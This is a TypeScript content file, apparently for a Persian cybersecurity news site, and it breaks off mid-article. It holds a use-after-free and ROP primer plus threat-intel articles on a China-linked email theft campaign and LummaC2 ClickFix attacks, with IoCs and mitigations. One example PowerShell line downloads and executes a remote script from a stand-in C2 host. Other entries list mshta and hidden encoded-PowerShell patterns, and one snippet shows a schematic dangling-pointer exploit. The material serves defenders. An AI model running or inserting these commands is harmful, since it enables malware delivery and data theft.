        "در دنیای پژوهش‌های امنیتی سطح بالا، فاصله میان پیدا کردن یک باگ که باعث بسته شدن ناگهانی برنامه (Crash) می‌شود تا نوشتن یک اکسپلویت پایدار که کنترل کامل پردازنده را به دست می‌گیرد، مرز میان یک گزارش باگ معمولی و یک سلاح سایبری روز صفر است. در کتاب مرجع «از روز صفر تا روز صفر» که به صورت کامل و دوزبانه در کتابخوان رهام در دسترس شماست، این مسیر گام‌به‌گام تشریح شده است.",
      sections: [
        {
          id: "sec-uaf-anatomy",
          heading: "۱. چرا آسیب‌پذیری Use-After-Free (UAF) محبوب‌ترین شکار محققان است؟",
          paragraphs: [
            "در زبان‌های مدیریت دستی حافظه مانند C و ++C، زمانی که یک شیء در حافظه Heap با تابع free یا delete آزاد می‌شود، اگر اشاره‌گر (Pointer) مربوط به آن صفر (NULL) نشود، به یک اشاره‌گر معلق (Dangling Pointer) تبدیل می‌گردد.",
            "اگر مهاجم بتواند بلافاصله پس از آزاد شدن آن بخش از حافظه، داده جدیدی با اندازه مشابه و با مقادیر کنترل‌شده خود در همان آدرس تخصیص دهد (تکنیک Heap Spraying / Grooming)، برنامه هنگام فراخوانی متدهای مجازی شیء قبلی (vtable)، به جای کد اصلی برنامه به آدرس دلخواه مهاجم پرش می‌کند!"
          ],
          codeLanguage: "cpp",
          codeSnippet:
            "// نمونه کلاسیک آسیب‌پذیری Use-After-Free در C++\nstruct SessionHandler {\n    virtual void process() { /* منطق عادی */ }\n};\n\nSessionHandler* handler = new SessionHandler();\ndelete handler; // حافظه آزاد شد اما اشاره‌گر handler هنوز به همان آدرس اشاره می‌کند!\n\n// مهاجم حافظه آزادشده را با داده دستکاری‌شده پر می‌کند (Heap Grooming)\nchar* attackerControlled = (char*)malloc(sizeof(SessionHandler));\nmemcpy(attackerControlled, fakeVtablePayload, sizeof(SessionHandler));\n\nhandler->process(); // پرش جریان اجرا به آدرس جعلی مهاجم (Hijacked Control Flow)!"
        },
        {
          id: "sec-aslr-rop",
          heading: "۲. تقابل اکسپلویت و دفاع: عبور از DEP و ASLR با تکنیک ROP",
          paragraphs: [
            "در گذشته، مهاجم شل‌کد خود را روی پشته (Stack) می‌نوشت و اشاره‌گر دستورالعمل (RIP/EIP) را به آن منتقل می‌کرد. با معرفی قابلیت DEP/NX (غیرقابل اجرا کردن صفحات داده)، اجرای مستقیم کد از روی Stack و Heap غیرممکن شد.",
            "در پاسخ، تکنیک برنامه‌نویسی مبتنی بر بازگشت (Return-Oriented Programming یا ROP) شکل گرفت. در ROP، مهاجم هیچ کد جدیدی تزریق نمی‌کند، بلکه تکه‌های کوچکی از کدهای موجود در کتابخانه‌های خود برنامه را که به دستور ret ختم می‌شوند (Gadgets) به هم زنجیر می‌کند. اما برای دانستن آدرس این گجت‌ها در حضور ASLR (تصادفی‌سازی چیدمان فضای آدرس)، مهاجم ابتدا نیازمند یک آسیب‌پذیری نشت اطلاعات (Info Leak) است تا آدرس پایه ماژول در حافظه را کشف کند."
          ],
          callout:
            "پیشنهاد مطالعه عمیق: برای مطالعه کامل کدها و نمودارهای تحلیل باینری، فصل‌های ۲ تا ۶ کتاب «از روز صفر تا روز صفر» را در کتابخوان دوزبانه رهام همراه با پادکست صوتی فارسی مطالعه فرمایید.",
          calloutType: "tip"
        }
      ],
      conclusion:
        "درک دقیق مکانیزم‌های فساد حافظه و روش‌های نوین فازینگ (Coverage-guided Fuzzing)، به مهندسان امنیت کمک می‌کند تا پیش از مهاجمان، باگ‌های حیاتی را در چرخه توسعه شناسایی و رفع نمایند.",
      actionableTakeaways: [
        "در کامپایل پروژه‌های C/C++ پرچم‌های امنیتی کامل (-fstack-protector-strong, -D_FORTIFY_SOURCE=2, -Wl,-z,relro,-z,now, -fcf-protection) را فعال کنید.",
        "فازینگ خودکار با ابزارهای LibFuzzer و AFL++ به همراه AddressSanitizer (ASan) را در پایپ‌لاین CI/CD قرار دهید.",
        "برای ماژول‌های پردازش ورودی غیرقابل اعتماد (پارس کردن فایل، شبکه و تصویر) مهاجرت تدریجی به زبان‌های ایمن در برابر حافظه نظیر Rust را بررسی کنید."
      ]
    }
  }
];

export const DEFAULT_NEWS_ARTICLES: NewsArticle[] = [
  {
    id: "news-thn-fbi-china-emails-2026",
    slug: "fbi-says-china-linked-hackers-ran-portal-access-stolen-emails",
    title: "افشاگری FBI: هکرهای وابسته به چین پورتالی برای دسترسی شخص ثالث به ایمیل‌های مسروقه دولتی راه‌اندازی کرده بودند",
    subtitle: "آژانس‌های امنیتی ۷ کشور اعلام کردند گروه هکری وابسته به شرکت Integrity Technology Group با بهره‌برداری از ۸ آسیب‌پذیری بحرانی و ابزارهای اختصاصی، ایمیل‌های سازمان‌های دولتی و درمانی را سرقت و در قالب وب‌اپلیکیشن به مشتریان خود می‌فروخته است.",
    category: "apt",
    categoryLabel: "عملیات سایبری APT و تهدیدات پیشرفته",
    severity: "CRITICAL",
    status: "published",
    isBreaking: true,
    date: "۱۷ مهر ۱۴۰۵ · ۱۹:۳۰",
    readTime: "۸ دقیقه",
    author: "تحریریه امنیت سایبری رهام",
    source: "The Hacker News",
    sourceUrl: "https://thehackernews.com/2026/10/fbi-says-china-linked-hackers-ran.html",
    coverImage: "/api/proxy-image?url=" + encodeURIComponent("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyj_ek8VTEYw5CpVqkAK63I01D84oGBvRsHmwpjeAfat3TCDqzhXqRWXWCGkNZKwH3rF0uyeuowCSGcBT-mLkdw-174FA0gGh8ZIVKOXUbXt9w0eTZZTlMGE-ySkZIIkswfxe0-cEU9ww6E8iIpWI2eDQU_NrsezDxIoE2WNBt8mDtG6nYeke9Ut17_JY/s1700-nu-rw-lo-l85-e365/china-email.jpg"),
    downloadedImages: [
      {
        originalUrl: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyj_ek8VTEYw5CpVqkAK63I01D84oGBvRsHmwpjeAfat3TCDqzhXqRWXWCGkNZKwH3rF0uyeuowCSGcBT-mLkdw-174FA0gGh8ZIVKOXUbXt9w0eTZZTlMGE-ySkZIIkswfxe0-cEU9ww6E8iIpWI2eDQU_NrsezDxIoE2WNBt8mDtG6nYeke9Ut17_JY/s1700-nu-rw-lo-l85-e365/china-email.jpg",
        localPath: "/api/proxy-image?url=" + encodeURIComponent("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyj_ek8VTEYw5CpVqkAK63I01D84oGBvRsHmwpjeAfat3TCDqzhXqRWXWCGkNZKwH3rF0uyeuowCSGcBT-mLkdw-174FA0gGh8ZIVKOXUbXt9w0eTZZTlMGE-ySkZIIkswfxe0-cEU9ww6E8iIpWI2eDQU_NrsezDxIoE2WNBt8mDtG6nYeke9Ut17_JY/s1700-nu-rw-lo-l85-e365/china-email.jpg"),
        alt: "حملات سایبری هکرهای وابسته به چین به سرورهای ایمیل سازمانی",
        status: "downloaded",
      },
      {
        originalUrl: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVYuoalvwUlwvLZFDideJ8jW4rz-IodX0Lwi7uyP7Ab0wiDeu_BqVhPDdejQQ65MC3p9Xc4MApnHz56NJ5SDc1HMg0DvozkkGYv9TGtDLCh26v1yD5-GyzQxnA5-6A6B4beW96H_6FyrByq22cvU5JDF-i8e5GIfV4wg1SpCvjwAJt74FaqkAb2gzqE7ll/s728-nu-rw-lo-l85-e365/core-d.png",
        localPath: "/api/proxy-image?url=" + encodeURIComponent("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVYuoalvwUlwvLZFDideJ8jW4rz-IodX0Lwi7uyP7Ab0wiDeu_BqVhPDdejQQ65MC3p9Xc4MApnHz56NJ5SDc1HMg0DvozkkGYv9TGtDLCh26v1yD5-GyzQxnA5-6A6B4beW96H_6FyrByq22cvU5JDF-i8e5GIfV4wg1SpCvjwAJt74FaqkAb2gzqE7ll/s728-nu-rw-lo-l85-e365/core-d.png"),
        alt: "تحلیل فنی ساختار فرماندهی و کنترل بات‌نت",
        status: "downloaded",
      },
      {
        originalUrl: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVV2rRkX8tRMF6gCzemvQNpwFwGxRWxY1cJEYfoLLSj1EZYJOlj5WTR77t0i6kELXujYcaHTpRDqTjCbVHH5Pnh7wzxUiKP5j4dsDkWIMlp2bmpZsL0jeAsA_19pHH5UPtyBvNkZdyGEULOAsXPcraMP5CYjQRFefhXRSdEjYkrdcpUnc4ILcvcdEfAauE/s728-nu-rw-lo-l85-e365/tl-d.jpg",
        localPath: "/api/proxy-image?url=" + encodeURIComponent("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVV2rRkX8tRMF6gCzemvQNpwFwGxRWxY1cJEYfoLLSj1EZYJOlj5WTR77t0i6kELXujYcaHTpRDqTjCbVHH5Pnh7wzxUiKP5j4dsDkWIMlp2bmpZsL0jeAsA_19pHH5UPtyBvNkZdyGEULOAsXPcraMP5CYjQRFefhXRSdEjYkrdcpUnc4ILcvcdEfAauE/s728-nu-rw-lo-l85-e365/tl-d.jpg"),
        alt: "دفاع شبکه و هاردنینگ سرورهای ایمیل",
        status: "downloaded",
      },
    ],
    views: 6140,
    cveIds: [
      "CVE-2014-6278",
      "CVE-2015-3306",
      "CVE-2015-5477",
      "CVE-2016-3081",
      "CVE-2019-11510",
      "CVE-2021-22205",
      "CVE-2021-3199",
      "CVE-2023-22894",
    ],
    cvssScore: "9.8",
    affectedProducts: [
      "Microsoft Exchange Server / Microsoft 365 (EWS, OWA, RPC, MAPI)",
      "GNU Bash, ProFTPD, ISC BIND DNS, Apache Struts",
      "Pulse Connect Secure, GitLab, ONLYOFFICE Document Server, Strapi CMS",
      "Active Directory Domain Controllers (DCSync Abuse)",
    ],
    exploitStatus: "بهره‌برداری فعال در حیات‌وحش (Active In-The-Wild Exploitation)",
    summary:
      "پلیس فدرال آمریکا (FBI) و نهادهای امنیت سایبری ۶ کشور دیگر در یک بیانیه مشترک هشدار دادند که هکرهای وابسته به شرکت امنیت سایبری Integrity Technology Group در چین، پورتال وبی راه‌اندازی کرده‌اند که امکان دسترسی اشخاص ثالث به محتوای ایمیل‌های مسروقه سازمانی را فراهم می‌کرده است.",
    keyHighlights: [
      "راه‌اندازی یک وب‌اپلیکیشن اختصاصی با دسترسی مبتنی بر URL برای مطالعه ایمیل‌های مسروقه نهادهای دولتی توسط مشتریان شخص ثالث.",
      "استفاده از بیش از ۱,۳۰۰ اسکریپت تست نفوذ و بهره‌برداری از ۸ آسیب‌پذیری شناخته‌شده در سرویس‌های عمومی اینترنتی.",
      "سرقت گسترده اطلاعات احراز هویت از کنترلرهای دامنه اکتیو دایرکتوری با استفاده از تکنیک DCSync و ابزار DC.exe.",
      "جمع‌آوری خودکار ایمیل‌ها با اسکریپت Curlc4.txt از طریق رابط EWS و بازگشت مداوم به حساب‌های Microsoft 365 با ابزار office-cli."
    ],
    sections: [
      {
        heading: "کالبدشکافی عملیات نفوذ و اهداف مورد حمله",
        paragraphs: [
          "به گفته اف‌بی‌آی و سازمان‌های امنیت سایبری همکار در ۶ کشور دیگر در تاریخ ۸ اکتبر ۲۰۲۶، هکرهای وابسته به شرکت فناوری چینی Integrity Technology Group به سرقت محتوای ایمیل از نهادهای دولتی، سازمان‌های اجرای قانون، سیستم‌های بهداشت و درمان، و نهادهای مذهبی در جنوب شرقی آسیا، آمریکای شمالی و آفریقا پرداخته‌اند.",
          "شرکت مذکور پیش از این توسط ایالات متحده و بریتانیا تحت تحریم قرار گرفته بود. مهاجمان با بهره‌برداری از ابزاری مشتمل بر بیش از ۱,۳۰۰ اسکریپت خودکار، وب‌سایت‌های سازمانی را اسکن کرده، رمزهای عبور حساب‌های Microsoft 365 و Exchange را حدس زده و محتوای صندوق‌های پستی را با ابزارهای اختصاصی کپی می‌کردند.",
          "طبق بیانیه مشترک آژانس‌ها، این هکرها حداقل از اواسط ژانویه ۲۰۲۱ به شبکه‌های قربانیان نفوذ کرده‌اند. در سپتامبر ۲۰۲۴ نیز اف‌بی‌آی بات‌نت بزرگ Raptor Train متشکل از ۲۰۰ هزار دستگاه روتر و دوربین را که تحت کنترل همین شرکت بود متوقف کرده بود."
        ],
        imageUrl: "/api/proxy-image?url=" + encodeURIComponent("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVYuoalvwUlwvLZFDideJ8jW4rz-IodX0Lwi7uyP7Ab0wiDeu_BqVhPDdejQQ65MC3p9Xc4MApnHz56NJ5SDc1HMg0DvozkkGYv9TGtDLCh26v1yD5-GyzQxnA5-6A6B4beW96H_6FyrByq22cvU5JDF-i8e5GIfV4wg1SpCvjwAJt74FaqkAb2gzqE7ll/s728-nu-rw-lo-l85-e365/core-d.png"),
        imageAlt: "تحلیل ساختار بات‌نت و سرورهای فرماندهی و کنترل C2",
      },
      {
        heading: "جدول آسیب‌پذیری‌های مورد بهره‌برداری (CVEs)",
        paragraphs: [
          "مهاجمان عمدتاً از طریق ابزارهای خط فرمانی مبتنی بر کدهای اکسپلویت نوشته‌شده به زبان‌های پایتون و Go وارد شبکه‌ها می‌شدند. بیانیه به ۸ نقص امنیتی شناخته‌شده اشاره می‌کند که مهاجمان با موفقیت از آن‌ها در اسکریپت‌های نفوذ خود استفاده کرده‌اند:"
        ],
        table: {
          headers: ["شناسه آسیب‌پذیری", "محصول هدف", "نسخه‌های تحت تاثیر", "نسخه اصلاح‌شده"],
          rows: [
            ["CVE-2014-6278", "GNU Bash (Shellshock)", "تا نسخه 4.3 bash43-026", "تایید نشده"],
            ["CVE-2015-3306*", "ProFTPD", "نسخه 1.3.5", "نسخه 1.3.5a"],
            ["CVE-2015-5477*", "ISC BIND DNS", "نسخه 9.x قبل از 9.9.7-P2 و 9.10.x", "نسخه‌های 9.9.7-P2 / 9.10.2-P3"],
            ["CVE-2016-3081*", "Apache Struts", "نسخه‌های 2.3.19 تا 2.3.28", "نسخه‌های 2.3.20.3 / 2.3.24.3"],
            ["CVE-2019-11510", "Pulse Connect Secure", "نسخه‌های 8.2، 8.3 و 9.0", "نسخه‌های 8.2R12.1 / 8.3R7.1"],
            ["CVE-2021-22205", "GitLab", "تمامی نسخه‌ها از 11.9 به بالا", "نسخه‌های 13.8.8 / 13.9.6 / 13.10.3"],
            ["CVE-2021-3199*", "ONLYOFFICE Document Server", "نسخه‌های 5.1.5 تا 5.6.2", "نسخه 5.6.3"],
            ["CVE-2023-22894*", "Strapi Headless CMS", "نسخه‌های تا 4.5.5 (و تا 4.7.9)", "نسخه 4.8.0"],
          ],
        },
        callout: "آسیب‌پذیری‌های دارای ستاره (*) مواردی هستند که به کاتالوگ آسیب‌پذیری‌های مورد بهره‌برداری CISA KEV افزوده شده‌اند."
      },
      {
        heading: "تکنیک‌های فیشینگ با ورود جعلی (XSS) و حمله اسپری رمز عبور (EBurst)",
        paragraphs: [
          "راه دیگر ورود مهاجمان، ایجاد صفحات لاگین جعلی بود. اف‌بی‌آی یک پی‌لود اسکریپت‌نویسی بین سایتی (XSS) کشف کرد که فرم ورود جعلی نام‌کاربری و رمز عبور را روی صفحات وب آسیب‌پذیر تزریق می‌کرد. پس از وارد کردن نام‌کاربری و رمز عبور توسط کاربر، صفحه یک فایل ZIP رمزگذاری‌شده حاوی بدافزاری به نام live700_v1.exe به او ارائه می‌داد.",
          "با اجرای آن، پردازشی به نام DiagTrack.exe (با نام مشابه سرویس مجاز تله‌متری ویندوز) آغاز به کار کرده و ترافیک رمزنگاری‌شده را به دامنه dns.studiocloud[.]xyz ارسال می‌کرد.",
          "علاوه بر این، مهاجمان از تکنیک حمله اسپری رمز عبور (Password Spraying) با ابزار متن‌باز پایتونی به نام EBurst برای نفوذ به حساب‌های کاربری Microsoft 365 و Exchange بهره می‌بردند که رابط‌های متنوعی نظیر ECP, EWS, OAB, OWA, RPC, MAPI و PowerShell را هدف قرار می‌دهد."
        ]
      },
      {
        heading: "نحوه ماندگاری در شبکه، سرقت هویتی (DCSync) و استخراج ایمیل‌ها",
        paragraphs: [
          "برای حفظ دسترسی دائمی، مهاجمان برنامه VPN مجاز SoftEther را نصب می‌کردند تا نرم‌افزارهای امنیتی به آن مشکوک نشوند. آن‌ها نام فایل نصبی را به conhost.exe یا dllhost.exe تغییر می‌دادند و آن را طوری تنظیم می‌کردند که با هر بالا آمدن سیستم مجدداً متصل شود.",
          "برای استخراج اعتبارنامه‌ها، آن‌ها ابزاری به نام DC.exe را اجرا می‌کردند که از تکنیک DCSync برای کپی کردن اطلاعات از Domain Controller از طریق سرویس تکثیر اکتیو دایرکتوری بهره می‌برد.",
          "برای سرقت ایمیل‌ها، هکرها رباتی بر پایه اسکریپت PHP به نام Curlc4.txt ساختند که ایمیل‌ها را از طریق Exchange Web Services (EWS) جمع‌آوری، فشرده‌سازی و رمزگذاری کرده و به دامنه C2 به نام natcloudservice[.]com ارسال می‌کرد. ابزار دیگری به نام office-cli نیز با تکیه بر اطلاعات Client ID و Tenant ID به صورت پیوسته به حساب‌های Microsoft 365 بازمی‌گشت تا ایمیل‌های بازه‌های زمانی مختلف را استخراج نماید."
        ],
        imageUrl: "/api/proxy-image?url=" + encodeURIComponent("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVV2rRkX8tRMF6gCzemvQNpwFwGxRWxY1cJEYfoLLSj1EZYJOlj5WTR77t0i6kELXujYcaHTpRDqTjCbVHH5Pnh7wzxUiKP5j4dsDkWIMlp2bmpZsL0jeAsA_19pHH5UPtyBvNkZdyGEULOAsXPcraMP5CYjQRFefhXRSdEjYkrdcpUnc4ILcvcdEfAauE/s728-nu-rw-lo-l85-e365/tl-d.jpg"),
        imageAlt: "اقدامات ضروری مدافعان برای هاردنینگ سرورهای ایمیل و شبکه",
      },
      {
        heading: "راهکارهای پیشنهادی آژانس‌های امنیت سایبری برای مدافعان",
        paragraphs: [
          "نهادهای امنیتی به تیم‌های دفاعی توصیه اکید کرده‌اند که نشانه‌های این فعالیت را در شبکه‌های خود شکار کنند. گام‌های ضروری شامل موارد زیر است:",
          "• غیرفعال کردن پورت‌ها و سرویس‌های بدون استفاده، به ویژه دسترسی از راه دور و اشتراک فایل.\n• اعتبارسنجی و پاکسازی ورودی‌های کاربر در برنامه‌های کاربردی وب جهت مقابله با حملات XSS.\n• الزام احراز هویت چندعاملی (MFA)، به ویژه برای وب‌میل، VPN و حساب‌های دسترسی به سیستم‌های حساس.\n• نظارت بر تکثیرهای غیرمنتظره در اکتیو دایرکتوری (نشانه‌ای از اجرای تکنیک DCSync).\n• بررسی دقیق اپلیکیشن‌های متصل در حساب‌های ابری که مجوز خواندن ایمیل و فایل دارند.\n• اعمال فوری وصله‌های امنیتی برای ۸ آسیب‌پذیری فهرست‌شده و جایگزینی نرم‌افزارهایی که پشتیبانی آن‌ها پایان یافته است."
        ]
      }
    ],
    iocs: [
      {
        type: "Domain/C2",
        value: "dns.studiocloud[.]xyz",
        description: "دامنه فرماندهی و کنترل متصل به باینری DiagTrack.exe و گروه Integrity Technology"
      },
      {
        type: "Domain/C2",
        value: "natcloudservice[.]com",
        description: "دامنه سرور کنترل C2 دریافت‌کننده ایمیل‌های استخراج‌شده از طریق اسکریپت Curlc4.txt"
      },
      {
        type: "Process/Command",
        value: "DC.exe (DCSync Active Directory Replication Abuse)",
        description: "ابزار کپی‌برداری از پایگاه‌داده NTDS.dit کنترلر دامنه از طریق Active Directory Replication"
      },
      {
        type: "File Path",
        value: "Curlc4.txt / office-cli",
        description: "ابزارهای اختصاصی سرقت ایمیل سازمانی از Microsoft 365 و Microsoft Exchange EWS"
      }
    ],
    mitigationSteps: [
      "مسدودسازی تمامی دامنه‌ها و IPهای C2 شناسایی‌شده در سطح فایروال و EDR.",
      "نصب فوری وصله‌های رسمی برای ۸ نقص امنیتی CVE-2023-22894، CVE-2021-22205، CVE-2016-3081 و CVE-2019-11510.",
      "بررسی لاگ‌های دسترسی سرویس‌های EWS و اکتیو دایرکتوری برای شناسایی الگوهای مشکوک درخواست تکثیر DCSync.",
      "پیاده‌سازی احراز هویت چندعاملی سخت‌گیرانه (FIDO2) بر روی تمامی نقاط دسترسی وب‌میل و VPN."
    ],
    timeline: [
      { time: "ژانویه ۲۰۲۱", event: "آغاز نفوذهای اولیه گروه وابسته به Integrity Technology به شبکه‌های سازمانی" },
      { time: "سپتامبر ۲۰۲۴", event: "اقدام هماهنگ FBI برای انهدام بات‌نت ۲۰۰ هزار دستگاهی Raptor Train" },
      { time: "اکتبر ۲۰۲۶", event: "انتشار بیانیه رسمی ۷ آژانس بین‌المللی درباره وب‌اپلیکیشن سرقت ایمیل و اسکریپت‌های پایتون/Go" }
    ],
    tags: [
      "APT",
      "FBI Advisory",
      "The Hacker News",
      "Integrity Technology",
      "Microsoft Exchange",
      "EWS",
      "DCSync",
      "CVE-2023-22894",
      "CVE-2021-22205",
      "CVE-2016-3081"
    ]
  },
  {
    id: "news-01",
    slug: "lummac2-clickfix-powershell-campaign-targeting-enterprise-sessions",
    title: "هشدار فوری: موج جدید حملات بدافزار استیلر LummaC2 با تکنیک مهندسی اجتماعی ClickFix و کپچای جعلی",
    subtitle: "مهاجمان با نمایش صفحات تایید هویت جعلی Cloudflare و Google Meet، کاربران را فریب می‌دهند تا دستورات مبهم‌شده PowerShell و MSHTA را مستقیماً در پنجره Run ویندوز اجرا کنند.",
    category: "urgent",
    categoryLabel: "هشدار فوری و فعال",
    severity: "CRITICAL",
    status: "published",
    isBreaking: true,
    date: "۱۵ مهر ۱۴۰۴ · ۱۴:۳۰",
    readTime: "۶ دقیقه",
    author: "تحریریه امنیت سایبری و هوش تهدیدات رهام",
    source: "Roham Threat Intel / CERT Advisory",
    views: 4890,
    cveIds: ["MITRE T1204.004", "MITRE T1539", "MITRE T1555.003"],
    cvssScore: "9.6",
    affectedProducts: [
      "Windows 10 / Windows 11 Workstations",
      "Google Chrome, Microsoft Edge, Brave (Session & Cookie Stores)",
      "Telegram Desktop, Discord, Crypto Extension Wallets"
    ],
    exploitStatus: "در حال بهره‌برداری گسترده در حیات‌وحش (Active Campaign)",
    summary:
      "پژوهشگران مرکز عملیات امنیت رهام کارزار گسترده‌ای از توزیع نسخه ۴.۰ بدافزار سرقت اطلاعات LummaC2 را رصد کرده‌اند که بدون نیاز به دانلود فایل اجرایی کلاسیک، از طریق کپی خودکار اسکریپت در کلیپ‌بورد و تکنیک ClickFix اجرا می‌شود.",
    keyHighlights: [
      "استفاده از درگاه‌های کپچای جعلی («من ربات نیستم») که کد مخرب PowerShell را به صورت نامحسوس در کلیپ‌بورد کاربر کپی می‌کنند.",
      "فریب کاربر برای فشردن کلیدهای ترکیبی Win + R، سپس Ctrl + V و Enter که منجر به اجرای مستقیم پی로드 در حافظه می‌شود.",
      "دور زدن آنتی‌ویروس‌های مبتنی بر فایل به دلیل اجرای کاملاً بدون فایل (Fileless Execution) از طریق باینری‌های بومی ویندوز (LOLBins).",
      "سرقت کامل کوکی‌های نشست مرورگر، توکن‌های دسترسی ابری و پوشه tdata تلگرام در کمتر از ۳۰ ثانیه."
    ],
    sections: [
      {
        heading: "کالبدشکافی زنجیره حمله ClickFix: چرا کاربران حرفه‌ای هم فریب می‌خورند؟",
        paragraphs: [
          "برخلاف حملات فیشینگ سنتی که از کاربر می‌خواهند رمز عبور خود را وارد کند یا یک فایل اجرایی (.exe یا .zip) دانلود نماید، تکنیک ClickFix بر پایه فریب رفتاری طراحی شده است. کاربر هنگام مراجعه به یک وب‌سایت آلوده، لینک تبلیغاتی مخرب یا فایل HTML/PDF پیوست ایمیل، با یک پنجره خطای ظاهراً رسمی از طرف Cloudflare، مرورگر کروم یا Google Meet روبه‌رو می‌شود.",
          "به محض کلیک کاربر روی دکمه «Verify You Are Human» یا «Fix Microphone Driver»، اسکریپت جاوااسکریپت صفحه با استفاده از تابع navigator.clipboard.writeText یک دستور طولانی و مبهم‌شده را در حافظه کلیپ‌بورد ویندوز کپی می‌کند و از کاربر می‌خواهد برای رفع خطا، کلید Win + R را زده و دستور را اجرا کند."
        ],
        codeLanguage: "powershell",
        codeSnippet:
          "# نمونه ساختار دستور کپی‌شده در کلیپ‌بورد (خنثی‌شده جهت بررسی تحلیلی):\npowershell.exe -w hidden -nop -c \"$u='https://c2-stage-cdn[.]net/gate/init.ps1'; $r=Invoke-RestMethod -Uri $u; Invoke-Expression $r\" # ✅ CloudFlare Verification ID: 8942-AX",
        callout:
          "توجه کنید که مهاجم در انتهای خط دستور، یک کامنت (# Verification ID) اضافه می‌کند؛ چون کادر کوچک پنجره Run ویندوز تنها انتهای متن یا ابتدای آن را نشان می‌دهد و کاربر متوجه دستور مخرب پاورشل نمی‌شود!"
      },
      {
        heading: "رفتار نسخه جدید LummaC2 در حافظه و استخراج داده‌ها",
        paragraphs: [
          "پس از اجرای دستور اولیه، اسکریپت پاورشل یک لودر دات‌نت یا شل‌کد بومی را دانلود کرده و از طریق تکنیک Process Hollowing درون پروسه مجاز سیستم‌عامل مانند explorer.exe یا svchost.exe تزریق می‌کند.",
          "بدافزار LummaC2 سپس با استفاده از تماس‌های سیستمی مستقیم (Indirect Syscalls) هوک‌های EDRهای معمولی را دور زده و بلافاصله فایل‌های SQLite مرورگرها، کلیدهای رمزگشایی DPAPI و کیف‌پول‌های افزونه‌ای را استخراج و به سرور فرماندهی ارسال می‌کند."
        ]
      }
    ],
    iocs: [
      {
        type: "Process/Command",
        value: "powershell.exe -w hidden -ep bypass -EncodedCommand",
        description: "اجرای پاورشل مخفی با آرگومان کدگذاری‌شده Base64 از طریق کلیدهای Win+R (ثبت در کلید رجیستری RunMRU)"
      },
      {
        type: "File Path",
        value: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
        description: "کلید رجیستری ویندوز که دستورات تایپ‌شده توسط کاربر در پنجره Run را ثبت می‌کند (مناسب برای شکار تهدید در SIEM)"
      },
      {
        type: "Process/Command",
        value: "mshta.exe https://*/*.hta",
        description: "فراخوانی مستقیم فایل‌های HTA از راه دور توسط باینری بومی mshta.exe"
      }
    ],
    mitigationSteps: [
      "غیرفعال کردن یا محدودسازی پنجره Run ویندوز (Win+R) برای کاربران عادی سازمان از طریق Group Policy.",
      "مسدودسازی اجرای مستقیم mshta.exe، wscript.exe و cscript.exe برای ارتباطات خروجی اینترنت در فایروال ویندوز.",
      "فعال‌سازی PowerShell Script Block Logging (Event ID 4104) و پایش کلید رجیستری RunMRU در سامانه SIEM/SOC.",
      "استفاده از راهکارهای محافظت مستقیم از مخزن کوکی و سشن مرورگرها (مانند آنتی‌استیلر رهام) برای خنثی‌سازی مرحله سرقت داده."
    ],
    timeline: [
      { time: "مهر ۱۴۰۴ — هفته اول", event: "مشاهده افزایش ۳۰۰ درصدی صفحات فیشینگ مجهز به اسکریپت ClickFix در شبکه‌های تبلیغاتی" },
      { time: "۱۲ مهر ۱۴۰۴", event: "شناسایی ماژول جدید LummaC2 با قابلیت دور زدن هوک‌های سطح کاربر در آزمایشگاه رهام" },
      { time: "۱۵ مهر ۱۴۰۴", event: "انتشار بولتن هشدار فوری و قواعد شناسایی (IoCs) برای تیم‌های امنیت سازمان‌ها" }
    ],
    tags: ["LummaC2", "ClickFix", "PowerShell", "Infostealer", "Fileless Malware", "SOC Alert"]
  },
  {
    id: "news-02",
    slug: "critical-zero-day-enterprise-vpn-rdp-gateway-pre-auth-rce",
    title: "آسیب‌پذیری روز صفر بحرانی (CVSS 9.8) در درگاه‌های VPN و دسترسی از راه دور سازمانی با قابلیت اجرای کد بدون احراز هویت",
    subtitle: "نقص سرریز بافر مبتنی بر Heap در ماژول پردازش بسته‌های TLS/HTTP به مهاجمان امکان می‌دهد پیش از لاگین، شل مدیریتی (root) روی گیت‌وی لبه شبکه دریافت کنند.",
    category: "zeroday",
    categoryLabel: "آسیب‌پذیری روز صفر (0-Day)",
    severity: "CRITICAL",
    status: "published",
    isBreaking: true,
    date: "۱۲ مهر ۱۴۰۴ · ۰۹:۱۵",
    readTime: "۷ دقیقه",
    author: "واحد تحلیل آسیب‌پذیری و زیرساخت رهام",
    source: "Roham Vulnerability Intelligence",
    views: 3910,
    cveIds: ["CVE-2025-21333", "CVE-2025-24983"],
    cvssScore: "9.8",
    affectedProducts: [
      "Enterprise SSL-VPN & Zero-Trust Gateways",
      "Remote Desktop Gateway Appliances",
      "Edge Reverse Proxy Appliances"
    ],
    exploitStatus: "اکسپلویت هدفمند توسط گروه‌های APT تایید شده است",
    summary:
      "یک آسیب‌پذیری بحرانی فساد حافظه از نوع Heap-based Buffer Overflow در سرویس مدیریت احراز هویت درگاه‌های ارتباط از راه دور شناسایی شده است که به مهاجمان راه دور اجازه می‌دهد تنها با ارسال یک درخواست HTTP دستکاری‌شده، کد دلخواه خود را با بالاترین سطح دسترسی اجرا کنند.",
    keyHighlights: [
      "امتیاز بحرانی CVSS 9.8 از ۱۰ به دلیل عدم نیاز به هیچ‌گونه نام کاربری، رمز عبور یا تعامل با کاربر (Pre-Authentication RCE).",
      "استفاده مهاجمان از وب‌شل‌های سبک در حافظه برای سرقت اعتبارنامه‌های Active Directory و نشست‌های کاربران متصل به VPN.",
      "لزوم اعمال فوری پچ امنیتی و بررسی لاگ‌های غیرعادی کرش سرویس وب گیت‌وی."
    ],
    sections: [
      {
        heading: "جزئیات فنی آسیب‌پذیری سرریز بافر در پردازش هدرهای HTTP",
        paragraphs: [
